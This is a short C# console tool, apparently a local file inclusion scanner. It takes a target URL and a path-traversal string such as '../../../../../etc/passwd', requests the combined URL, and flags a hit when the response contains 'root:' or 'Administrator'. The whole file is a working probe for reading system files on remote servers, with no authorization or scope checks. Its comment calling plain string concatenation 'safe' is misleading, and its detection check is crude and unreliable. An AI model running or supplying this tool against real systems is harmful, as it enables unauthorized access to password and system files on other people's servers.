
using System;
using System.Net;

namespace LFIScanner
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+]Enter target url>> ");
            string url = Console.ReadLine();

            Console.WriteLine("[+]Enter a file path (e.g., ../../../../../etc/passwd)>> ");
            string filePath = Console.ReadLine();

            try
            {
                string response = FetchContent(url, filePath);
                if (response.Contains("root:") || response.Contains("Administrator")) // Adjust detection logic as needed
                {
                    Console.WriteLine($"LFI vulnerability found at {url + filePath}");
                }
                else
                {
                    Console.WriteLine($"No LFI vulnerability found at {url + filePath}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        static string FetchContent(string url, string filePath)
        {
            string fullUrl = url + filePath; // Combine URL and file path safely
            using (WebClient client = new WebClient())
            {
                return client.DownloadString(fullUrl);
            }
        }
    }
}